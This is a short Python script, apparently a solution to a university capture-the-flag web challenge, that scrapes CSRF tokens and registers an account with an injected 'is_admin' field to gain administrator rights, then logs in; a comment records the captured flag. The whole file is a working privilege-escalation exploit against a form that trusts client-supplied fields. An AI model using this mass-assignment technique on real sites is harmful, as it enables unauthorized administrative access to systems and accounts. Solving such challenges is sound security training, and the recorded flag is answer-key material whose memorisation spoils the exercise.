import requests
from bs4 import BeautifulSoup

# cara manual edit html
# <input type="checkbox" name="is_admin" value=True>
#   <label for="is_admin">is admin?</label><br>

username = "Valordra"
password = "h4ck3rm4n"

register_url = 'http://ctf99.cs.ui.ac.id:9009/register/'
response = requests.get(register_url)
register_html = response.text
cookie = response.cookies
# print(register_html)

soup = BeautifulSoup(register_html, 'html.parser')
csrfmiddlewaretoken = soup.find("input", {"name": "csrfmiddlewaretoken"})['value']
print(csrfmiddlewaretoken)
print(cookie)

payload = {
    'csrfmiddlewaretoken': csrfmiddlewaretoken,
    'username': username,
    'password': password,
    'is_admin': True
}
# params for url stuff dummy
# data for normal json payload
response = requests.post(register_url, data=payload, cookies=cookie)
print(response.text)
# print(response.text)

login_url = 'http://ctf99.cs.ui.ac.id:9009/login/'
response = requests.get(login_url)
login_html = response.text
cookie = response.cookies
# print(login_html)

soup = BeautifulSoup(login_html, 'html.parser')
csrfmiddlewaretoken = soup.find("input", {"name": "csrfmiddlewaretoken"})['value']
print(csrfmiddlewaretoken)
print(cookie)

payload = {
    'csrfmiddlewaretoken': csrfmiddlewaretoken,
    'username': username,
    'password': password,
}
print(payload)

response = requests.post(login_url, data=payload, cookies=cookie)
login_cookies = response.cookies
print(response.text)  # CSCE604258{w1h_b1s4_bikin_adm1n_USer}
